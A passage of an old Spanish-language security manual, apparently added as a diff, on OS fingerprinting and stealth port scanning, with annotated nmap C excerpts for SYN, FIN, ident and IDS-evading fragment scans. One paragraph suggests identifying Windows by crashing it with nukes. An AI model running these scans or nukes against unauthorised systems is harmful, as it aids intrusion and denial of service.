+tienden a  mantener el mismo tamaño  de ventana para  cada sesion.  En
+cambio, cisco o Microsoft Windows/NT cambia constantemente.
+
+        $ hping2 localhost
+	...
+
+	y al analizar, por ejemplo dos de los paquetes con ethereal vemos:
+
+	Window Size: 512 (0x0200)
+	...
+	Window Size: 512 (0x0200)
+
+	- Tratamiento de fragmentacion: Se basa en el hecho de que los
+sitemas  operativos tratan de  diferente forman  los fragmentos  de IP
+solapados;  mientras  algunos  mantienen  el material  inicial,  otros
+sobreescriben  la  porciones  antiguas  con las  nuevas.   De  dificil
+implementacion  puesto que  hay  sistemas operativos  que no  permiten
+mandar fragmentos  de IP  (lease Solaris), pero  si que es  cierto que
+tendria bastante utilidad.
+
+	No lo he analizado en la practica, ya que no encontre la forma
+de hacerlo con  hping2 y el hacer  un codigo que lo haga  no me parece
+materia para cubrir en este manual por tener bastante dificultad.
+
+
+	- Synflood:  una  tecnica  que  no me  parece  aplicable,  por
+razones bien marcadas.  Hay ciertos OSs que llega un momento en que no
+aceptan nuevas conexiones si has mandado demasiados paquetes SYN y por
+ejemplo algunos  sistemas operativos  solo admiten 8  paquetes. Linux,
+evita esto por medio de las SYN cookies.
+
+
+	- Nukes:  Como ya he  dicho anteriormente,  la pila  de Win95,
+WinNT o  Win98 parece  identica. Para distinguir  entre una u  otra el
+metodo  que propongo  es el  aplicar  nukes de  forma cronologica  (es
+decir, de  mas antiguos a  mas nuevos) e  ir viendo si el  servidor se
+cuelga o no;  de esta forma sabremos la version ya  que si sabemos que
+un  nuke  (por ejemplo,  Winnuke)  solo  funciona  con Win95  pues  ya
+tendremos  el OS.   Aun asi,  no  recomiendo este  metodo por  razones
+obvias.  Actualmente, estoy a la espera  de que mixter me aclare si el
+ha  conseguido alguna  forma  de distinguir  una  pila en  win* en  su
+nsat. De decirme como, lo incluire en este texto.
+
+
+	Fingerprinting pasivo
+	~~~~~~~~~~~~~~~~~~~~~
+
+	El fingerprinting pasivo, en realidad, se basa en lo mismo que
+el    fingerprinting   tradicional    pero   la    implementacion   es
+distinta. Esta, se hace mediante un sniffer que tracea el host remoto.
+
+	Como  ves, en  realidad, no  somos nosotros  los  que enviamos
+paquetes sino que simplemente nos dedicamos a recoger los paquetes que
+son enviados por otros.
+
+	Por  tanto, se  ve aqui  una primera  diferencia,  tenemos que
+tener acceso a una de las maquinas que este en la red interna del host
+remoto o del  host remoto en si, aunque esta  ultima posibilidad en la
+mayoria de los casos ya implicaria el conocimiento del OS del host.
+
+	Las cuatro cosas que comprobare en este tipo de fingerprinting
+son la TTL, el tama~o de  ventana (window size), el Don't Fragment bit
+y el  TOS. Pero  aun esta  por estudiar la  posibilidad de  fijarse en
+otras cosas que  podrian servir en ciertos casos  para distinguir unos
+OSs de otros; pero, en este manual, me centrare en unicamente en estos
+cuatro aspectos.  Para diferenciar unos sistemas  operativos de otros,
+habra que combinar estas cuatro pruebas.
+
+	Otras de las  cosas que se podrian estudiar  seria el id, ISN,
+opciones de TCP/IP...
+
+	Este sistema no  es infalible y funcionara con  unos OSs mejor
+que con otros y claro esta.
+
+
+        Por  ejemplo,  mediante el  uso  de  ethereal,  se loggea  una
+peticion  www mediante  el puerto  80.   Si seleccionamos  uno de  los
+paquetes vemos lo siguiente:
+
+	183-BARC-X45.libre.retevision.es -> 97-VIGO-X12.libre.retevision.es
+	Arrival Time: Jan 17, 2001 21:54:36.2724
+	Internet Protocol -> version: 4
+	Type of service: 0x00 (TOS)
+	Flags: 0x04 -> .1.. = Don't fragment: Set
+	Time to live: 58 (TTL)
+	Window size: 15928 en decimal (0x3E38)
+
+	Observas aqui, pues, los valores del TOS, DF bit, TTL y WS.
+
+	Inicialmente nos fijaremos en el valor del TTL:
+
+	El valor que podemos ver en  el log del ethereal es 58. Lo mas
+probable es que el valor sea 64 pero haya saltado 6 veces hasta llegar
+a nosotros, y en este caso se trata de un linux.
+
+	Pero,  los saltos  que hace  hasta  llegar a  nuestro host  lo
+podemos comprobar con  la ayuda de traceroute; claro  que sino quieres
+que sea reconocido  por el host a estudio  dicho traceroute sera mejor
+que  este pare  uno o  dos hops  antes del  host, siendo  esto posible
+gracias a poder especificar el time-to-live y asi podremos hacer:
+
+	$ /usr/sbin/traceroute -m 7 183-BARC-X45.libre.retevision.es
+	traceroute to 183-BARC-X45.libre.retevision.es (62.82.15.183),
+	7 hops max, 38 byte packets
+	1  VIGO-X12.red.retevision.es  (62.81.45.44) 135.048 ms 122.210
+	ms 129.345 ms
+	2  VIGO-R1.red.retevision.es (62.81.45.28) 129.757  ms 119.371
+	ms VIGO-R3.red.retevision.es (62.81.45.27) 139.679 ms
+	3 VIGO-R15.red.retevision.es (62.81.44.133) 127.784 ms 129.119
+	ms 119.800 ms
+	4 BARC-R15.red.retevision.es  (62.81.125.2) 159.456 ms 219.433
+	ms 214.197 ms
+	5  BARC-R11.red.retevision.es (62.81.24.5) 214.997  ms 219.233
+	ms 219.758 ms
+	6 BARC-X45.red.retevision.es (62.81.17.131) 210.725 ms 219.183
+	ms 219.693 ms
+
+	Pero, para  que se  vea que realmente  esto funciona,  en este
+caso te  copiare aqui el 7o  host para que  veas que ya seria  el host
+remoto:
+
+	7  183-BARC-X45.libre.retevision.es (62.82.15.183)  339.842 ms
+	BARC-X45 .red.retevision.es  (62.81.17.131) 199.385 ms 179.089
+	ms
+
+	A  continuacion adjunto  una  tabla con  los  TTL de  diversos
+sistemas operativos, especificando dicha ttl para tcp y udp:
+
+	Sistema operativo	   ttl-tcp	  ttl-udp
+	linux			   64		  64
+	MacOS/MacTCP 2.0.x	   60		  60
+	OS/2 TCP/IP 3.0		   64		  64
+	OSF/1 V3.2A		   60		  30
+	MS WfW			   32		  32
+	MS Windows 95		   32		  32
+	MS Windows NT 3.51	   32		  32
+	MS Windows NT 4.0	   128		  128
+	Solaris 2.x		   255		  255
+	Sun OS 4.1.3/4.1.4	   60		  60
+	Ultrix V4.1/V4.2A	   60		  30
+	VMS/Multinet		   64		  64
+	VMS/TCPware		   60		  64
+	VMS/Wollongong 1.1.1.1	   128		  30
+	VMS/UCX (ultimas ver.)	   128		  128
+	AIX			   60		  30
+	DEC Pathworks V5	   30		  30
+	FreeBSD 2.1R		   64		  64
+	HP/UX 9.0x		   30		  30
+	HP/UX 10.01		   64		  64
+	Irix 5.3		   60		  60
+	Irix 6.x		   60		  60
+
+
+	Lo  que  hay que  tener  en  cuenta,  es que  existen  ciertas
+utilidades que  permiten cambiar este valor  de TTL y  asi por ejemplo:
+
+       - HP/UX cuenta con una utilidad que cambia el valor del TTL en los
+       kernels  de  HP/UX llamada set_ttl hecha por el HP  Support Center
+
+       - En solaris se puede cambiar haciendo:
+       ndd -set /dev/ip ip_def_ttl 'number'
+
+       - En linux:
+       echo 'number' > /proc/sys/net/ipv4/ip_default_ttl
+
+       - En windows:
+       HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\Tcpip\Parameters
+
+
+	Pero   aun  asi,   se   puede  incluir   este   valor  en   el
+fingerprinting, para diferenciar algunos OSs de otros.
+
+        El  siguiente valor  a  tener en  cuenta  es el  tama~o de  la
+ventana (Window Size):
+
+	Como se ha comentado  anteriormente en los analisis basados en
+la  pila  TCP/IP tradicionales  ya  no  volvere  a repetir  la
+informacion.
+
+	Pero, cabe  destacar que en  la prueba especifica que  se hizo
+para  fingerprinting pasivo,  los valores  no cambiaron  y asi vemos:
+
+	Arrival Time: Jan 17, 2001 21:54:37.5323
+	Window size: 15928 en decimal
+
+	Arrival Time: Jan 17, 2001 21:54:38.1424
+	Window size: 15928
+
+	A continuacion, se analiza el bit DF:
+
+	Es  de valor  unico,  haciento esto  mas  facil el  distinguir
+algunos sistemas que  no lo usan, como por ejemplo  SCO o OpenBSD como
+se ha especificado en la seccion anterior.
+
+	Y  se observa  como en  el  ejemplo especifico  usado para  el
+fingerprinting pasivo:
+
+	Flags: 0x04 -> .1.. = Don't fragment: Set
+
+	El ultimo de los campos a estudiar es el TOS:
+
+	De valor  tambien limitado, actualmente no  esta muy estudiado
+en funcion de que varia, pero se piensa que depende de la sesion y del
+protocolo usado  en la misma. Este  valor de TOS ha  sido utilizado en
+uno de los metodos basados en ICMP de fingerprinting tradicional.
+
+
+	 2.2 Servicios
+	 ~~~~~~~~~~~~~
+
+	I Software de escaneo de puertos y vulnerabilidades: panorama actual
+	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+	Lo que quiero con esta  reducida seccion es simplemente dar mi
+opinion  acerca del software  de escaneo  de puertos  que hay  en este
+momento en la scene.
+
+	Es preciso destacar, que mientras algunos de los programas que
+detallo a  continuacion simplemente son escaneadores  de puertos otros
+tambien pueden  servir para  detectar vulnerabilidades en  el sistema,
+debidas  a daemons (escuchando  en puertos  abiertos) que  tienen bugs
+conocidos.
+       
+        Nmap: Lo puedes encontrar en http://www.insecure.org/nmap/index.html,
+se  trata  de  uno  de  los  escaneadores  de   puertos  mas  completos .
+Desarrollado por Fyodor .  Admite tanto un escaneo normal como  "silencioso".
+
+
+        Strobe-classb:  Lo podras encontrar en
+http://www.luyer.net/software/strobe-classb/  .
+Sirve  para  escanear  redes  grandes en poco tiempo  pero no es updateado .
+
+	Vetescan: esta en http://www.self-evident.com/sploits.html. Es
+normalmente  una herramienta  de "jaker",  ya  que con  ella se  puede
+escanear a  gran velocidad grandes  redes e incluye los  exploits para
+las vulnerabilidades que detecta en el propio tar.gz
+
+	Satan:  para  bajarlo  vete a  http://www.porcupine.org/satan/
+. Usa  una interface basada  en web y  su modelo de actuacion  ha sido
+heredado por  programas como  Nessus, Saint o  SARA.  A lo  mejor para
+hacerlo funcionar  en las mas modernas distribuciones  de linux tienes
+problemas.
+
+	Nessus: bajatelo de http://www.nessus.org/  . Es muy util. Hay
+tanto cliente  como servidor;  hay clientes para  X11, Java  y Windows
+pero  servidor unicamente  para  Unix.  Es  muy  facil agregar  nuevos
+chequeos para vulnerabilidades que  inicialmente no estaba preparado y
+su equipo de desarrolladores suele updatearlo frecuentemente.  Utiliza
+el  Nmap para hacer  un analisis  preliminar de  los puertos.  Mas que
+recomendable.
+
+	Saint:  lo  puedes  encontrar  en  http://www.wwdsi.com/saint/
+. Como ya he comentado se basa  en Satan y como este funciona a traves
+de web. Las  nuevas funcionalidades no son agregadas  de una forma muy
+rapida pero esto trae consigo un mejor funcionamiento del programa que
+destaca por clasificar en niveles el problema encontrado.
+
+	SARA:  se  encuentra  en  http://home.arc.com/sara/index.html.
+Hereda su  funcionamiento de Saint  y Satan.  Incluye  una herramienta
+para crear informes de las vulnerabilidades, etc.
+
+	NSAT: te lo  puedes bajar de http://mixter.void.ru/progs.html.
+Su  creador  es  mixter,  reconocido   profesional  de   la  seguridad
+informatica. Al igual  que nessus se le pueden  hacer reglas nuevas de
+chequeo para  nuevas vulnerabilidades no  existentes en el  momento de
+codear el  programa.  La pega  es que no  se puede utilizar  desde una
+maquina remota y solo funciona bajo linux/unix.
+
+	Messala:  bajalo  en  http://www.securityfocus.com/tools/1228.
+Este  programa me  ha sorprendido  gratamente ya  que analiza  un gran
+numero de vulnerabilidades  conocidas.  Ademas, sus desarrolladores lo
+updatean frecuentemente.
+
+	Mns: pillalo en alguna web de seguridad informatica ya que los
+enlaces  que van  a la  page de  dicho programa  no  funcionan.  Tiene
+capacidad de escanear "silenciosamente" y muestra vulnerabilidades.
+
+	Hay gran  numero de escaneadores de puertos  de nivel bastante
+basico, tanto en C como perl que tampoco me voy a poner a analizar por
+separado;    siempre    puedes    buscarlos   en    freshmeat.net    o
+packetstorm.securify.com.  En algun caso puede ser interesante bajarte
+alguno de ellos ya que te sera mas facil analizar el codigo usado para
+este tipo de utilidades.
+
+	Por otra  parte, cabe resaltar que  puedes encontrar reducidos
+.c que  unicamente comprueban la  existencia de una  vulnerabilidad en
+concreto.   Incluso,  te puede  ser  util,  el  hacerte algun  escaner
+especifico de cierta vulnerabilidad, en  caso de que esta no haya sido
+hecha publica.
+
+
+	II Tecnicas usadas en el escaneo de puertos
+	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+	En un escaneo de puertos,  se han ido incluyendo tecnicas, que
+en la mayoria de los casos lo  que buscan es que el escaneo de puertos
+no sea detectado  por el host remoto. Actualmente  hay un cierto vacio
+legal en lo que se refiere a  este tipo de acciones ya que no esta muy
+claro si es legal o  ilegal hacer dichos escaneos. Segun una sentencia
+reciente  (12-2000)  en USA,  el  escaneo  de  puertos no  es  ilegal,
+mientras no se perjudique al host remoto.
+
+	Escaneando TCP con connect(): es el metodo basico que es usado
+en los escaners de puertos.  El problema es que abre una conexion a un
+puerto de forma  que puede ser detectado dicho  intento y loggeado. La
+parte  positiva  es  que  destaca   por  su  rapidez  y  facilidad  de
+implementacion en codigo C. Puede  ser utilizado con varios sockets en
+paralelo para  asi no tener que usar  un bucle que haria  mas largo el
+proceso.
+
+	Por ejemplo en el PortScanner-1.2, encontramos:
+
+	...
+	while (((base_port + current_port) <= end_port) || !finished) {
+	sock = socket(PF_INET, SOCK_STREAM, 0);
+	...
+	if (connect(sock, (struct sockaddr *)&address2, sizeof(address2)) == 0)
+	...
+
+	y  a  continuacion en  el  code  simplemente encontramos  como
+intenta averiguar el nombre de  servicio asignado a cada puerto que va
+encontrando abierto,  pero no lo voy  a copiar aqui porque  es un poco
+largo  aunque  facil.  Vemos  pues,  como  el  funcionamiento de  este
+escaner es sumamente  sencillo y su archivo portscanner.c  es de facil
+comprension para  cualquier persona con  ciertos conocimientos de  C y
+unix networking programming.
+
+
+	Escaneando TCP  con SYN: Este metodo  es un poco  mejor que el
+clasico expuesto  anteriormente ya  que no abre  una conexion  TCP por
+completo,  por eso  el apelativo  "half-open"  en ingles.  Se basa  en
+enviar  un paquete  SYN a  un puerto  y si  se obtiene  un  SYN|ACK es
+inequivocamente porque el  puerto esta abierto y si  se obtiene un RST
+es  indicacion de que  el puerto  esta cerrado.   De estar  abierto se
+envia   un  RST   para  cerrar   la  conexion,   pero  esto   lo  hace
+automaticamente el kernel. Esta  tecnica seguramente hay en servidores
+en los  que no es detectada  pero actualmente ya  hay herramientas que
+permiten  su deteccion  como iplog,  ademas, necesitas  privilegios de
+root para construir dichos paquetes.
+
+	Por  ejemplo,  en  el   portscanner  hecho  por  Uriel  Maimon
+(lifesux@cox.org) para  su articulo en phrack 49  (Volume Seven, Issue
+Forty-Nine), Port Scanning without the SYN flag, vemos como define:
+
+	...
+
+	0: half-open scanning (type 0, SYN)
+	/* se observa que admite este tipo de escaneo */
+	...
+
+	inline int tcpip_send(int	socket,
+			      struct sockaddr_in *address,
+                              unsigned long s_addr,
+			      unsigned long t_addr,
+			      unsigned      s_port,
+			      unsigned      t_port,
+			      unsigned char tcpflags,
+			      unsigned long seq,
+			      unsigned long ack,
+			      unsigned      win,
+			      char          *datagram,
+			      unsigned      datasize)
+
+	/* para poder enviar paquetes configurables */
+	 ...
+
+
+	 tcp->th_sport	= htons(s_port);
+	 tcp->th_dport	= htons(t_port);
+	 tcp->th_off  	= 5;          /* 20 bytes, (no options) */
+	 tcp->th_flags	= tcpflags;
+	 tcp->th_seq	= htonl(seq);
+	 tcp->th_ack	= htonl(ack);
+	 tcp->th_win	= htons(win); /* we don't need any bigger, I guess. */
+
+	 /* opciones tcp */
+
+	 ...
+
+	 struct tcphdr       *tcp    = (struct tcphdr *)(packet+IPHDRSIZE);
+
+	 ...
+
+	 if (tcp->th_flags & (TH_ACK | TH_SYN))
+                              {
+                                 readport->state = 1;
+           	           	 printf(" (SYN+ACK)");
+                                 tcpip_send(rawsock,&destaddr,
+		                           spoof_addr,destaddr.sin_addr.s_addr
+                                           STCP_PORT,readport->n,
+                                           TH_RST,
+                                           readport->seq++, 0,
+                                           512,
+                                           NULL,
+                      		           0);
+	             		}
+	/* se observa aqui el corte despues con RST despues de recibir
+	respuesta */
+	  ...
+
+	Pero,  aun asi,  te  recomiendo que  revises  el codigo  por
+completo si quieres  entender bien este metodo aplicado  a codes en C,
+ya  que  tampoco  he  pasteado  todo  lo importante  sino  lo  que  he
+encontrado  interesante  segun  repasaba  el  codigo,  y  quizas  para
+entenderlo hay que verlo integramente.
+
+
+	Escaneando TCP  con FIN: si  piensas que el servidor  que esta
+analizando puede detectar un escaner  basado en la tecnica de envio de
+paquetes SYN,  siempre se  puede recurrir a  escaners basados  en este
+metodo. El hecho es que los puertos abiertos ante el envio de paquetes
+FIN  no  hacen nada,  los  ignoran,  en  cambio los  puertos  cerrados
+responden con un RST|ACK.  Este metodo,  pues, se basa en un bug de la
+implementacion TCP en ciertos  sistemas operativos pero hay en ciertos
+sistemas  que  esto no  funciona,  como en  el  caso  de las  maquinas
+Microsoft). Pero, en  las ultimas releases de ciertos  programas ya se
+agrega la  opcion incluso de detectar  este tipo de  scaneos.  Asi por
+ejemplo snort:
+
+Fri 29 03:25:58 honorato snort[565]: SCAN-SYN FIN: w.x.y.z:0 -> z.y.w.98:53
+
+	 Si quieres  ver que realmente  hay empresas que  se preocupan
+hasta de este  tipo de escaners puedes revisar el  gran numero de logs
+de      este     tipo      que     hay      en      (por     ejemplo):
+http://www.sans.org/y2k/070200-2000.htm
+
+	 Y  en nmap  encontramos (he  saltado  partes del  code de  la
+func., cuidado ):
+
+	 ...
+
+portlist fin_scan(struct hoststruct *target, unsigned short *portarray) {
+
+	 /* la  funcion, a continuacion de esto,  define variables, no
+lo he copiado, porque ocuparia demasiado.. */
+
+	 ...
+
+timeout = (target->rtt)? target->rtt + 10000 : 1e5;
+
+bzero(&stranger, sockaddr_in_size);
+bzero(portno, o.max_sockets * sizeof(unsigned short));
+bzero(trynum, o.max_sockets * sizeof(unsigned short));
+starttime = time(NULL);
+
+	 /* preliminares */
+
+	 ...
+
+if (o.debugging || o.verbose)
+  printf("Initiating FIN stealth scan against %s (%s), sleep delay: %ld usecond
+s\n", target->name, inet_ntoa(target->host), timeout);
+
+         /* se observa que indica que empieza el escaneo.. saca en
+	 pantalla datos del scan */
+
+	 ...
+
+if (!target->source_ip.s_addr) {
+  if (gethostname(myname, MAXHOSTNAMELEN) ||
+      !(myhostent = gethostbyname(myname)))
+    fatal("Your system is fucked up.\n");
+
+  memcpy(&target->source_ip, myhostent->h_addr_list[0], sizeof(struct in_addr))
+;
+  if (o.debugging || o.verbose)
+    printf("We skillfully deduced that your address is %s\n",
+           inet_ntoa(target->source_ip));
+}
+
+	  /* comprobaciones de que localhost va bien y saca en pantala
+nuestra direccion local */
+
+	  ...
+
+if (!(pd = pcap_open_live(target->device, 92, 0, 1500, err0r)))
+  fatal("pcap_open_live: %s", err0r);
+
+if (pcap_lookupnet(target->device, &localnet, &netmask, err0r) < 0)
+  fatal("Failed to lookup device subnet/netmask: %s", err0r);
+
+p = strdup(inet_ntoa(target->host));
+#ifdef HAVE_SNPRINTF
+snprintf(filter, sizeof(filter), "tcp and src host %s and dst host %s and
+dst port %d", p, inet_ntoa(target->source_ip), MAGIC_PORT );
+#else
+sprintf(filter, "tcp and src host %s and dst host %s and dst port %d", p,
+inet_ntoa(target->source_ip), MAGIC_PORT );
+#endif
+free(p);
+if (o.debugging)
+  printf("Packet capture filter: %s\n", filter);
+if (pcap_compile(pd, &fcode, filter, 0, netmask) < 0)
+  fatal("Error compiling our pcap filter: %s\n", pcap_geterr(pd));
+if (pcap_setfilter(pd, &fcode) < 0 )
+  fatal("Failed to set the pcap filter: %s\n", pcap_geterr(pd));
+
+	  /*  vemos como  Fyodor  hace  usa de  las  librerias pcap  y
+despues de dos comprobaciones con pcap_open_live() y pcap_lookupnet(),
+te recomiendo que  si no estas familiarizado con  la implementacion de
+pcap en C  que leas algo sobre el tema. La  funcion strdup devuelve un
+puntero  a una  nueva  cadena que  en  realidad es  duplicacion de  la
+variable que  tiene la direccion remota.  Despues  puedes observar que
+hace uso  de snprintf de estar  permitido su uso, y  sino usa sprintf,
+donde puedes ver  el host local, host remoto  y puerto. A continuacion
+libera p con  un free() y ves como monta el  Packet capture filter con
+pcap */
+
+	  ...
+
+if ((rawsd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) < 0 )
+  perror("socket trobles in fin_scan");
+
+	  /* creacion de socket, y comprobacion de que funciona */
+
+	  ...
+
+while(!done) {
+  for(i=0; i <  o.max_sockets; i++) {
+    if (!portno[i] && portarray[j]) {
+      portno[i] = portarray[j++];
+    }
+    if (portno[i]) {
+    if (o.fragscan)
+      send_small_fragz(rawsd, &target->source_ip, &target->host, MAGIC_PORT, po
+rtno[i], TH_FIN);
+    else send_tcp_raw(rawsd, &target->source_ip , &target->host, MAGIC_PORT,
+                      portno[i], 0, 0, TH_FIN, 0, 0, 0);
+    usleep(10000); /* *WE* normally do not need this, but the target
+                      lamer often does */
+    }
+  }
+
+	/*  interesante :),  bueno, puedes  observar un  bucle  de uso
+obvio  y  fijate   en  send_small_fragz()  y  send_tcp_raw().  Tambien
+interesante el uso del  temporizador, con comentario del propio fyodor
+incluido */
+
+	...
+
+   {
+      if (bytes < (4 * ip->ip_hl) + 4)
+        continue;
+      if (ip->ip_src.s_addr == target->host.s_addr)
+      {
+        tcp = (struct tcphdr *) (((char *) ip) + 4 * ip->ip_hl);
+
+	if (tcp->th_flags &  TH_RST)
+	{
+	badport = ntohs(tcp->th_sport);
+	  if  (o.debugging >  1) printf("Nothing  open on  port %d\n", badport)
+;  /*  delete  the  port  from  active  scanning  */
+	  for(i=0; i < o.max_sockets; i++)
+		   if (portno[i] == badport)
+	           {
+		   if (o.debugging && trynum[i] > 0) printf("Bad port %d caught
+		   on  fin scan,  try number  %d\n", badport,  trynum[i]  + 1);
+		   trynum[i]  =   0;
+		   portno[i]  =   0;
+		   break;
+		   }
+		   if   (i  == o.max_sockets)
+		   {
+		   if  (o.debugging)  printf("Late packet  or
+		   dupe,  deleting  port  %d.\n", badport);
+		   dupesinarow++;
+		   if (target->ports) deleteport(&target->ports,     badport,
+	  IPPROTO_TCP);
+		   }
+		}
+		else
+		if  (o.debugging   >   1)
+		{
+		printf("Strange  packet  from  target%d!   Here  it  is:\n",
+		ntohs(tcp->th_sport));
+		if       (bytes      >=      40)
+		readtcppacket(response,1); else hdump(response,bytes);
+		}
+	}
+      }
+
+	/*  fijate dentro  de if  (tcp->th_flags &  TH_RST) que  si se
+cumple comprueba if (o.debugging > 1) y abre un bucle, con dos if's en
+su  interior en  los que  tambien conviene  fijarse. if  (portno[i] ==
+badport)...if (i ==  o.max_sockets)... y en el interior  de los mismos
+imprime los Bad  port y borra puerto del escaneo  por ser "Late packet
+or dupe" respectivamente. Si no se cumple que (tcp->th_flags & TH_RST)
+entonces comprueba si  o.debuffing > 1 y de serlo mira  lo que pasa en
+el code */
+
+	...
+
+/* adjust waiting time if neccessary */
+  if (dupesinarow > 6)
+     {
+    if (o.debugging || o.verbose)
+      printf("Slowing down send frequency due to multiple late packets.\n");
+    if (timeout < 10 * (target->rtt + 20000)) timeout *= 1.5;
+    else
+      {
+      printf("Too many late packets despite send frequency decreases, skipping
+scan.\n");
+      return target->ports;
+      }
+  }
+
+        /*  mas  comprobaciones,  para  diferentes  tipos  de  problemas,
+tampoco veo necesario detallarlo otra  vez ya que creo que se entiende
+bastante bien de analizar todo el code */
+
+	...
+
+
+  someleft = 0;
+  for(i=0; i < o.max_sockets; i++)
+    if (portno[i]) {
+      if (++trynum[i] >= retries) {
+        if (o.verbose || o.debugging)
+          printf("Good port %d detected by fin_scan!\n", portno[i]);
+        addport(&target->ports, portno[i], IPPROTO_TCP, NULL);
+        send_tcp_raw( rawsd, &target->source_ip, &target->host, MAGIC_PORT, por
+tno[i], 0, 0,
+                      TH_FIN, 0, 0, 0);
+        portno[i] = trynum[i] = 0;
+      }
+      else someleft = 1;
+    }
+
+  if (!portarray[j] && (!someleft || --waiting_period <= 0)) done++;
+}
+
+     /* voila, me  parece que lo deja bien claro  el printf, fijate en
+addport() y send_tcp_raw(). */
+
+	...
+
+ if (o.debugging || o.verbose)
+  printf("The TCP stealth FIN scan took %ld seconds to scan %d ports.\n",
+        (long) time(NULL) - starttime, o.numports);
+pcap_close(pd);
+close(rawsd);
+return target->ports;
+}
+        /* bueno.. se acabo, curioso, eh? */
+
+
+	Escaneando TCP  con 'reverse ident':  esta tecnica se  basa en
+que el protocolo  ident (lee rfc1413) te permite  descubrir el usuario
+propietario de un  proceso conectado via TCP incluso si  no ha sido el
+proceso  el que  ha iniciado  la  conexion.  Esto,  permite saber  los
+propietarios  de cada  daemon  que escucha  en  puertos abiertos.   El
+problema es que  se necesita abrir una conexion TCP  completa y por lo
+tanto es facilmente detectable.  Un  ejemplo de codigo que aplica esto
+lo encontramos en el nmap de Fyodor:
+
+	...
+
+	int getidentinfoz(struct in_addr target, int localport, int remoteport,
+                  char *owner) {
+
+	/* inicio de  la funcion en el que se  aplica dicho metodo, no
+voy a copiar las definiciones de variables.  */
+
+	...
+
+	owner[0] = '\0';
+	if ((sd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)) == -1)
+	{ perror("Socket troubles"); exit(1); }
+	sock.sin_family = AF_INET;
+	sock.sin_addr.s_addr = target.s_addr;
+	sock.sin_port = htons(113);
+	usleep(50000);
+
+	/* me parece  que esta muy claro la creacion  de un socket() y
+la definicion de  la familia, addr y puerto  en lo referente a sock. */
+
+	...
+
+res = connect(sd, (struct sockaddr *) &sock, sizeof(struct sockaddr_in));
+if (res < 0 ) {
+  if (o.debugging || o.verbose)
+    printf("identd port not active now for some reason ... hope we didn't break
+ it!\n");
+  close(sd);
+  return 0;
+}
+
+	/*  en el  supuesto de  que  el connect  falle, es  decir <  0
+entonces  comprueba if  (o.debugging  || o.verbose)  y ya  ves tu.. */
+
+	...
+
+
+sprintf(request,"%hi,%hi\r\n", remoteport, localport);
+if (o.debugging > 1) printf("Connected to identd, sending request: %s", request
+);
+if (write(sd, request, strlen(request) + 1) == -1) {
+  perror("identd write");
+  close(sd);
+  return 0;
+}
+else if ((res = read(sd, response, 1024)) == -1) {
+  perror("reading from identd");
+  close(sd);
+  return 0;
+}
+else {
+  close(sd);
+  if (o.debugging > 1) printf("Read %d bytes from identd: %s\n", res, response)
+;
+
+	/* se observa  como si la o.debugging > 1  entonces es que que
+se ha conseguido conexion identd.  Despues vemos el intento de write()
+y de  read() con identd y la  salida del numero de  bytes leidos desde
+identd en caso de llevarse a cabo */
+
+	...
+
+
+  if ((p = strchr(response, ':'))) {
+    p++;
+    if ((q = strtok(p, " :"))) {
+      if (!strcasecmp( q, "error")) {
+        if (strstr(response, "HIDDEN-USER") || strstr(response, "hidden-user"))
+ {
+          printf("identd returning HIDDEN-USER, giving up on it\n");
+          return -1;
+        }
+        if (o.debugging) printf("ERROR returned from identd for port %d\n", rem
+oteport);
+	return 0;
+      }
+      if ((os = strtok(NULL, " :"))) {
+        if ((p = strtok(NULL, " :"))) {
+          if ((q = strchr(p, '\r'))) *q = '\0';
+          if ((q = strchr(p, '\n'))) *q = '\0';
+          strncpy(owner, p, 512);
+          owner[512] = '\0';
+        }
+      }
+    }
+  }
+}
+return 1;
+}
+
+	/* se observa como despues si localiza : en la cadena response
+(la enviada por identd).  Despues,  se observa el intento de averiguar
+el usuario, cuya salida comprueba que no sea HIDDEN-USER o hidden-user
+ya que esto querria decir que no se puede saber */
+
+
+        Fragmentation scanning: Este metodo  se basa en una tecnica no
+totalmente nueva sino  que es una variacion de  otras tecnicas, ya que
+en realidad, y como mostrare en el ejemplo de codigo es un scan basado
+en SYN o FIN pero con peque~os paquetes fragmentados.  En realidad, se
+mandan  una  pareja  de  peque~os  fragmentos  IP  al  host  remoto  a
+estudiar.  El  principal  problema  es que  algunos  programas  tienen
+problemas para tratar  este tipo de paquetes.  La  ventaja es que este
+metodo de escaneo es mas dificil de detectar y filtrar por los IDS.
+        A continuacion, detallo un ejemplo en C de dicha tecnica:
+
+	...
+
+int send_small_fragz(int sd, struct in_addr *source, struct in_addr *victim,
+                     int sport, int dport, int flags) {
+
+	/* inicio de la funcion en la que se ve un ejemplo practico de
+uso de este metodo */
+
+	...
+
+struct pseudo_header {
+/* for computing TCP checksum, see TCP/IP Illustrated p. 145 */
+  unsigned long s_addy;
+  unsigned long d_addr;
+  char zer0;
+  unsigned char protocol;
+  unsigned short length;
+};
+
+	/* haz lo  que dice fyodor en su comentario  y te enteraras un
+poco mas de lo que significa esta estructura. Ademas, te recomiendo no
+solo que veas la  p.  145 sino que leas TCP/IP Illustrated  vol. 1 y 2
+si  quieres realmente  tener un  control del  funcionamiento  de redes
+TCP/IP */
+
+        ...
+
+char packet[sizeof(struct ip) + sizeof(struct tcphdr) + 100];
+struct ip *ip = (struct ip *) packet;
+struct tcphdr *tcp = (struct tcphdr *) (packet + sizeof(struct ip));
+struct pseudo_header *pseudo = (struct pseudo_header *) (packet + sizeof(struct
+ ip) - sizeof(struct pseudo_header));
+char *frag2 = packet + sizeof(struct ip) + 16;
+struct ip *ip2 = (struct ip *) (frag2 - sizeof(struct ip));
+int res;
+struct sockaddr_in sock;
+int id;
+
+	/*  definiciones de  estructuras  y variables,  fijate en  las
+estructuras de  tipo ip, tcphdr y  pseudo_header.  Realmente necesitas
+conceptos de programacion de sockets  bajo C si quieres entenderlo; te
+recomiendo   Unix  Networking   Programming   vol.  1   y   2  de   R.
+Stevens. Tampoco me parece el  proposito de este manual explicar en si
+lo  que es  la programacion  de sockets  en C,  unicamente  mostrar el
+codigo usado para las tecnicas de escaneo especificadas. */
+
+        ...
+
+sock.sin_family = AF_INET;
+sock.sin_port = htons(dport);
+
+sock.sin_addr.s_addr = victim->s_addr;
+
+bzero((char *)packet, sizeof(struct ip) + sizeof(struct tcphdr));
+
+	/* definicion de familia, puerto y direccion de sock.. */
